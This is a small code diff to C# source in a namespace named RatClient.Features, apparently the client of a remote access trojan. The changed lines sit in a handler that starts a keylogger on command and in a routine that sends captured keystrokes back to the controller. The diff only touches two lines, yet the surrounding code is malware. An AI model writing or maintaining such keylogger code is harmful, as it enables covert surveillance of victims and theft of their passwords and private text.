@@ -47,7 +47,7 @@ namespace RatClient.Features
 
         private void HandleMessage(dynamic message)
         {
-            switch (message["type"].ToString())
+            switch (message["type"])
             {
                 case "start_keylogger":
                     Start();
@@ -64,7 +64,7 @@ namespace RatClient.Features
             if (!string.IsNullOrEmpty(keystrokes))
             {
                 SendJson(new { type = "keystroke", key = keystrokes });
-                keystrokes.Clear();
+                keystrokes = "";
             }
         }
 
